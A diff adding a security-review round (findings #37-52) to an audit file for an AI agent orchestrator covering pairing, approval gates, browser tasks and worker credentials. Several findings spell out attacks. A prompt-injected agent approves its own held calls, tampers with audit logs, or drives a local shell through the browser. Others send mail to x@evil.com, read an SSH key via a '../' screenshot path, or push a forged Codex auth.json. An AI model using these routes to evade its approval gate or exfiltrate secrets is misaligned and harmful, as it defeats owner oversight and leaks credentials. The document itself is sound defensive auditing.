@@ -458,3 +458,217 @@ Every async throw in `handleRequest` becomes a 500, and the process keeps runnin
 **Fixed** (#222): models.test expects `defaultEffort`; task-sound fixture uses the Settings sheet's `st*` ids; ui-fallbacks
 reads reflection fallbacks from the global kv `reflect_settings` (Settings sheet), and the task drawer's "Add fallback"
 carries the chip's `normal` class.
+
+## Round 6 (2026-09-28, task #287): cluster, approvals, live view, extensions, restart/machines
+
+Read at 0dae80d, by code, plus three throwaway repros (a gate-proxy with a fake connector upstream, `runAgentCli` with
+server.mjs's MCP wiring and a fake SDK `query`, and `classify()` on a fake snapshot); the live server was not touched.
+The task said the last item was #37, but the file ended at #36, so this round starts at #37.
+
+Checked and found sound: pairing codes are 40 bits from an unbiased alphabet (256 % 32 = 0), stored as sha256 and
+valid 10 min (1 h multi-use). `claim` is synchronous, so a one-time code can't be used twice, and claim and whoami 401s go
+through the login lockout. Node tokens are 256-bit, looked up by hash and compared with `timingSafeEqual`. The WSS
+upgrade refuses unknown tokens before reading a frame, and every frame re-checks that the row still exists (a revoked
+worker is closed with 4003). `hello.node` must match the token's node. Frames are capped at 1 MB and validated by type,
+direction and field types. Workers can't send `git.credential` or any controller-only type, and 5 bad frames close the
+socket. Every job frame (`accept`/`event`/`check`/`wip`/`done`/`phase`/`error`) is ignored unless `jobs.get(id).node`
+is the sending node, so a worker can't claim, finish or post events for another node's task. A `job.done` sha must match
+the fetched `origin/agent-orch/task-<id>` tip before a merge. Log-tail and screen replies are matched by a random `req`
+and the node. The worker still acts only on `WORKER_ACCEPTS` and imports no server/orchestrator/cluster/runtimes module.
+Self-update is sent only when a reading from this connection shows no running job and the scheduler has nothing placed
+or offered there. An `updating` node takes no new work, and a failed update isn't retried for the same origin/main.
+A disk drain lifts itself only for `drain_kind='disk'`, and an owner undrain sets `health_ack`.
+The file channel is safe against path tricks: ids are `[\w-]` and box names are fixed, writes use a 0600 tmp file and
+a rename, and the host saves screenshots only for `MEDIA_ID_RE` ids. `decide`/`expire`/`endRun` check `pending` without an
+await between the check and the write, so they can't race. Local pendings are cancelled at boot, and remote ones survive
+and are re-sent on re-attach.
+The live view drives input and navigation only for the view's controller, and only while no task is active or after
+take-over. Closing the controlling socket hands back, and a worker drops every take-over when the head's socket drops.
+`normUrl` allows only http(s). Frame data is drawn through an `Image`, and titles and URLs go into
+`textContent`/`value`. Extension bundles are safe too: skill and subagent names match `EXT_ENTRY_RE` (no dot-leading
+names, no `..`) and file paths are `relPath` (no empty, `.`, `..`, backslash or control segments). Blobs are
+sha-checked, a skill is written into a fresh temp dir and renamed in, and only entries an earlier sync recorded are
+deleted. Hand-installed entries are kept, and the controller skips symlinks when it builds the bundle. EXT_PATH needs an
+enabled node's token. `/api/restart-when-idle`, `/api/orch/parallel` (`autoRestart` must be a boolean), the
+`/api/cluster/*` owner routes and `PATCH /api/orch/tasks/:id/run-on` sit behind the session gate, and POSTs also need
+the same origin. `run-on` accepts only a string or null naming a known node.
+
+### 37. [high] On the controller, task runs get neither the approval gate nor the browser: server.mjs drops the run config (server.mjs:676)
+- **What:** `setMcpSource((agent) => ext.mcpRun(agent))` ignores the second argument. agents.mjs `mcpOf` calls
+  `mcpSource(agent, {browser, gate})` for a gated or browser run, so every local run gets the plain
+  `<DATA>/extensions/claude-mcp.json` (codex: `-p agent-orch`). No `gated()` proxy config is written, and no Playwright
+  server is added. `gateHooks` then finds no `proxy-<server>.json` and allows every MCP call. The worker path is fine,
+  because it passes `mcp: ext.mcpRun(agent, run)` explicitly. The tests pass because approval-gate-run and
+  browser-capability install their own `(agent, run) => ext.mcpRun(agent, run)`.
+- **Repro (verified):** Use a temp HOME, `createExtensions`, and `saveMcp({name:'mail', commandLine:'node mail-mcp.js',
+  outbound:'send_email'})`. Install server.mjs's lambda, then call `runAgentCli({agent:'claude', gate:{dir, hook:true},
+  browser:{identity:'default'}, query: fake})`. The `mcp-config` is `claude-mcp.json` with `mail → node mail-mcp.js` (no
+  gate-proxy, no playwright), `proxy-mail.json` doesn't exist, and the hook answers `{}` (allow) for
+  `mcp__mail__send_email`. On the live app, an owner connector's outbound tools run unapproved in every controller task.
+  A browser task placed on the controller (`controllerBrowser`) has no browser, or it gets the owner's own ungated
+  `playwright` server.
+- **Fix:** `setMcpSource((agent, run) => ext.mcpRun(agent, run))`. Add a regression test that boots server.mjs (or imports
+  its wiring) and checks that a gated run's config names gate-proxy.mjs.
+
+### 38. [high] A gated run can approve its own held calls, or skip the gate: the gate and the agent share one Unix user and the agent has a shell (gate.mjs:237-253, :280-286; agents.mjs:236; browser-live.mjs:66)
+- **What:** Task runs use `bypassPermissions` (Codex: `--dangerously-bypass-approvals-and-sandbox`), so the agent has an
+  unrestricted shell as the user that owns `<DATA>/gate/run-<id>/` (worker: `~/.agent-orch-worker/gate/job-<id>/`). The
+  path is on the gate-proxy command line (`ps`) and in its config. Any process can drop
+  `approvals/<id>.answer.json`: `ask()` accepts the first answer file it sees, and `serve()` skips questions that already
+  have one. There are other ways out too:
+  - The profile's Chromium listens on a DevTools port with no auth on 127.0.0.1 (`DevToolsActivePort` in the profile),
+    so any local process can drive the signed-in page or dump its cookies.
+  - `--password-store=basic` leaves the cookie DB readable with a fixed key.
+  - The gate-dir `audit.jsonl` that `hostGate` tails is writable too. Injected lines are copied into
+    `<DATA>/audit/<task>.jsonl`, and truncating the file stops the tail (`size <= off`), so later calls never reach the
+    permanent log. The permanent log's hash chain has no key, so the same user can rewrite it and recompute the chain.
+  AGENTIC.md admits the sandbox isn't built yet ("Honest limit", phase 2/5). But the UI presents approvals as a hard stop,
+  and the threat model is a prompt-injected page.
+- **Repro (verified):** Run gate-proxy.mjs on a connector config (`outbound: ['send_email']`) with a fake upstream, and send
+  `tools/call send_email {to: x@evil.com}`. When `approvals/<id>.json` appears, a second process writes
+  `{"decision":"approve","by":"owner"}` to `<id>.answer.json`. The client gets `UPSTREAM EXECUTED send_email`, and the
+  audit line reads `"decision":"approve","by":"owner"`. Other tasks on the same node (code tasks included) can use the
+  DevTools-port route against a profile a browser task or the live view has open.
+- **Fix:** Build AGENTIC.md's run sandbox before relying on the gate. Until then, run tasks that get a gated server
+  without a shell (Claude `dontAsk` with allowedTools that exclude Bash; Codex `workspace-write` sandbox), keep the gate dir
+  and profiles outside what any run can read or write, and have the host record which approval ids it created and
+  refuse answers for any other id.
+
+### 39. [med] Outbound connectors run ungated in worker code jobs and in planner and reflection runs (worker.mjs:1017; orchestrator.mjs:1764, :2391, :2661)
+- **What:** Only runs with `gated` get a gate. On the controller that means work tasks (and, per #37, not even those
+  today). Planner and reflection runs call `runAgent` without `gated`, and they read untrusted web content (WebFetch).
+  On a worker, only browser jobs open a gate (`needsBrowser(spec) ? openGate(job) : null`). Every other job gets
+  `ext.mcpRun(spec.agent)`, which is the synced MCP list with the owner's connectors and their secrets (EXT_PATH),
+  unwrapped.
+- **Failure:** The owner adds a mail MCP server with `outbound: send_email`. A code task placed on the Mac worker, or any
+  reflection, can call `mcp__mail__send_email` with no approval and no audit line. The same task on the controller would
+  be gated (once #37 is fixed).
+- **Fix:** Gate every run that is given a server with `outbound` tools (worker: `openGate` whenever `mcpFor` would wrap
+  something), or leave connectors out of planner, reflection and non-browser remote runs.
+
+### 40. [med] The browser classifier treats keyboard sends and common outbound buttons as draft (gate.mjs:16, :27-30, :143-151)
+- **What:** `browser_press_key` is always draft. So is `browser_type` with `submit: true` unless the field's own name
+  matches a pattern. `DEFAULT_PATTERNS` lacks Post, Reply, Submit, Buy, Order and Checkout. An icon-only button (no
+  accessible name) is matched only against the agent's own `element` text, which the agent chooses.
+- **Repro (verified, `classify()` on a Slack-like snapshot):** `browser_type {ref: message box, submit: true}` → draft,
+  and in Slack, WhatsApp or LinkedIn web, Enter sends the message. `browser_press_key {key: 'Control+Enter'}` → draft,
+  and that sends a Gmail draft. Clicking a button named "Post" → draft, and so does clicking a nameless button described
+  as "the blue icon".
+- **Fix:** Class Enter and Ctrl/Meta+Enter key presses, and `type` with `submit`, as outbound unless the snapshot shows
+  no form or composer is focused. Add Post, Reply, Submit, Buy, Order, Checkout, Tweet and Save & send to the defaults,
+  and treat nameless buttons as outbound.
+
+### 41. [low] Browser tasks can open loopback services, and Chromium runs without its sandbox on Linux (gate.mjs:123-126; browser.mjs:96; browser-live.mjs:70)
+- **What:** `browser_navigate` to `http://127.0.0.1:…` is draft. The controller has ttyd on `127.0.0.1:7682` (`-W`, no
+  credential; auth is Caddy's `forward_auth`), the app on :3000 and Caddy's admin API on :2019. A page loaded from
+  127.0.0.1:7682 is same-origin for ttyd's `-O` check, so a prompt-injected run can type into a real shell through
+  `browser_type` alone. Both the MCP and the live-view Chromium get `--no-sandbox` on Linux, so a renderer bug on any
+  page the task visits runs as the app user. This adds little while runs have Bash (#38), but it becomes the escape
+  once the run sandbox exists.
+- **Fix:** Pass `--blocked-origins` for loopback, link-local and private ranges to the Playwright MCP (or class such
+  navigations as outbound), and set `AGENT_ORCH_BROWSER_SANDBOX=1` wherever the kernel allows it.
+
+### 42. [med] A paired worker can fill the controller's disk and stall its single core: no frame budget (cluster.mjs:380-421, :178, :347-359; node-metrics.mjs:83-91)
+- **What:** Frames have no rate limit. Each `resources` frame is appended to `<DATA>/metrics/nodes/<id>.jsonl` with its
+  `cpu` array uncapped (up to ~1 MB per frame), kept at full resolution for an hour, and `read()` loads the whole file
+  synchronously. Each frame also writes `nodes.resources` (1 MB of JSON) and bumps `changed()`. `view()` falls back to
+  `resources.sha`, so every new random sha spawns a `git rev-list` and adds a `counts` entry that is never evicted.
+  `GET EXT_PATH` re-reads, base64s, stringifies and gzips the whole bundle (up to ~43 MB) on every request, with no
+  cache. `approval` events create rows and owner notices with no cap. A disabled node can do all of this too (#45).
+- **Failure:** One buggy or compromised worker that sends 1 MB `resources` frames at link speed adds GBs per minute to
+  the controller's metrics file. Or it loops `GET /api/cluster/ext`, and the 1-core VPS stops serving chats and the
+  scheduler.
+- **Fix:** Give each connection a frame budget (e.g. `resources`/`inventory` at most one per heartbeat/2, everything
+  else ≤ 50/s, close on overrun). Clip `cpu` to ≤ 256 entries, take the version sha only from `hello`, cache the gzipped
+  bundle by hash, and cap pending approvals per run.
+
+### 43. [med] autoRestart exits without checking that the new code boots; a boot crash leaves the app and the web terminal down (server.mjs:307-317, :318-330)
+- **What:** `startRestartDrain` goes to `process.exit(0)` without checking the new HEAD. With `autoRestart` on, any
+  merged task that breaks server start-up restarts straight into the crash. Examples: a syntax error in a module only
+  server.mjs imports, or a migration that throws on the live DB. The unit has `Restart=always`, `RestartSec=2` and
+  systemd's default `StartLimitBurst=5` / `StartLimitIntervalSec=10s` (checked with `systemctl show`), so a crash at
+  import hits the start limit and the unit stays failed. `/shell/` goes through Caddy's `forward_auth` to :3000, so the
+  web terminal is down as well, and only SSH can recover it. Nobody is watching when this happens, because autoRestart
+  exists so that nobody has to be.
+- **Fix:** Before exiting, run `node --check` on every root `*.mjs`, then boot the new code once on a spare port with a
+  temp copy of the data dir (or `CW_NO_ORCHESTRATOR=1`) and require `/auth/check` to answer. If that fails, stay up, log
+  it and skip that HEAD. Also add `StartLimitIntervalSec=0` (or a larger burst) to the unit.
+
+### 44. [med] A restart drain freezes the whole scheduler behind remote jobs and runs waiting for an approval (orchestrator.mjs:2488-2491, :1771-1772; server.mjs:312)
+- **What:** `drain()` stops all claiming until `running` is empty. That includes remote jobs, which survive a controller
+  restart by design (they are re-adopted), and local browser runs held on an approval. The gate keeps those runs'
+  timeout pushed back for as long as an approval is pending (`ttlHours` default 24 h, max 336 h).
+- **Failure:** autoRestart is on. A merge touches `*.mjs` while one browser task waits for the owner's answer overnight.
+  No other task starts until the owner answers or the approval expires (24 h). The same happens behind a 3 h job on the
+  Mac.
+- **Fix:** Don't wait for remote runs in the restart drain (they are adopted after boot). Cap the wait for approval-held
+  runs, then requeue them with a handoff, or tell the owner the restart waits on approval N.
+
+### 45. [low] A disabled node still connects and receives the head's Claude token, Codex login and extension hashes (cluster.mjs:330-334, :401-403; agent-share.mjs:104, :112)
+- **What:** `handleUpgrade` accepts any row with the token, enabled or not. `wireAgentShare` calls `syncNode` on every
+  `hello` with `creds`, and `shareTargets` lists every connected node, so `agent.credential` goes to disabled nodes too.
+  EXT_PATH already returns 403 for them, which shows the intent. Its telemetry and approval frames are also still
+  processed (#42).
+- **Failure:** The owner disables a MacBook they no longer trust (Machines → Disable) instead of removing it. On its
+  next reconnect it gets the long-lived `sk-ant-oat01-…` token and the ChatGPT `auth.json` again, plus every rotation.
+- **Fix:** Refuse the upgrade for `enabled=0` rows (e.g. 403), or skip disabled nodes in `syncNode`, `shareTargets`
+  and `sendExt`.
+
+### 46. [low] Any paired worker can overwrite the head's Codex sign-in with junk tokens (agent-share.mjs:80-90)
+- **What:** `fromWorker` adopts a worker's `auth.json` if it parses as a ChatGPT login with the head's `account_id` and a
+  later `last_refresh`. It never checks that the tokens work or belong to that account, and it doesn't keep the old
+  file. Every worker holds the head's `auth.json`, so every worker knows the `account_id`.
+- **Failure:** A compromised worker, or a corrupted refresh, sends
+  `{"auth_mode":"chatgpt","tokens":{"account_id":"<head's>","access_token":"x","refresh_token":"x"},"last_refresh":"2099-01-01T00:00:00Z"}`.
+  The head writes it over `~/.codex/auth.json` and broadcasts it, so Codex is signed out on the head and every worker.
+  The valid refresh token is gone, and later honest refreshes are refused as "not newer" until the owner signs in again.
+- **Fix:** Keep the previous file (`auth.json.prev`), reject a `last_refresh` more than a few minutes in the future,
+  and adopt only after checking that the id_token/access_token JWT decodes to the same account (or that `codex login
+  status` passes against the new file in a temp `CODEX_HOME`).
+
+### 47. [low] A task pinned to a machine that is later removed waits forever, with no notice (cluster.mjs:301-312; orchestrator.mjs:1459-1466)
+- **What:** `setTaskRunOn` checks the node only when the pin is set. `revoke()` deletes the node row but leaves
+  `tasks.run_on`, and `place()` returns null for a pin that no worker matches. The task stays queued, and `run_on_name`
+  falls back to the raw id. `claimNext` only looks at the first 25 runnable rows, so 25 such tasks at the front of the
+  queue block every task behind them.
+- **Fix:** In `revoke`, clear `run_on` for that node (and log it on each task), or have `place` treat an unknown pin
+  as unpinned with a task event.
+
+### 48. [low] A remote task with no `job.check` is merged as "check unavailable" (orchestrator.mjs:3128, :3134-3139)
+- **What:** When `remote.check` is null, finishWork makes up `[false, 'command not found: the worker ran no check', 127]`.
+  That matches the "program missing on this machine" branch, which accepts the task unverified with only a warning.
+- **Failure:** Version skew between the worker's and the controller's `extractCommand` (or a replay that loses the check
+  frame) means the worker runs no check. The task is merged with its Done-when never run anywhere.
+- **Fix:** Treat a missing check as a verify failure (`verifyFailed` with "the worker ran no check"), or run the check
+  here in the fetched worktree before merging.
+
+### 49. [low] "Always allow" ignores the call's arguments, so one Always covers every later send or any JavaScript (gate.mjs:114, :159; approvals.mjs:47)
+- **What:** A connector call's key is `server|tool`. Arbitrary-code browser tools (`browser_evaluate`,
+  `browser_run_code…`) are keyed `server|tool|host`, so the code isn't part of the key. The approval card shows the
+  arguments or code, but "Always" auto-approves later calls with different ones for the rest of the task.
+- **Failure:** The owner picks Always on `mail: send_email (to: bob@acme.com)`. A later `send_email (to: x@evil.com)`
+  in that task is recorded as `auto` and sent. The same goes for Always on a harmless `evaluate` that reads a value,
+  followed by an `evaluate` that clicks Pay.
+- **Fix:** Don't offer Always for arbitrary-code tools. For connectors, key on the recipient-like arguments (or a hash
+  of them), or label the button "every send_email in this task".
+
+### 50. [low] `bv_open` with a URL navigates a profile a task is using, without take-over (browser-view.mjs:92; browser-live.mjs:228, :248)
+- **What:** Input and `bv_nav` check `canDrive`, but a `url` on `bv_open` is navigated to right away. That happens on a
+  new session (`start` → `nav`) and when joining an existing one, even while a task is active. Today's UI never sends
+  `url`, so this is server-side trust in the client.
+- **Fix:** Honour `url` only when no task is active on the profile, or when this socket is the controller after
+  take-over.
+
+### 51. [low] The worker's gate reads `shots/<id>` for any id, including `../` paths (worker.mjs:1046-1052)
+- **What:** The worker's `openGate` `image(id)` reads `path.join(dir, 'shots', id)` for any id found in a question file
+  or an audit line. The head's `approvals.host` checks `MEDIA_ID_RE` first, but the worker doesn't. Both files can be
+  written by the run (#38).
+- **Failure:** An audit line with `"screenshot":"../../../.ssh/id_ed25519"` makes the worker read that file and send it
+  base64-encoded to the head as an `image` event. A multi-GB file is read into memory and gives an oversized frame.
+- **Fix:** `if (!MEDIA_ID_RE.test(id)) return;` in `image()`, as approvals.mjs does.
+
+### 52. [low] Workers pair with and talk to an `http://` head (worker.mjs:175-185, :712-716)
+- **What:** `pair()` stores any origin, and `wsUrl()` then uses `ws:`. Over plain http, the node token, the shared
+  Claude token and Codex login, the extension bundle (MCP secrets) and every job prompt travel in cleartext. An attacker
+  in the path can also serve skills and MCP commands that the worker runs, which means code execution.
+- **Fix:** Refuse a non-`https:` controller unless it is loopback (with an explicit `--insecure` flag for tests).
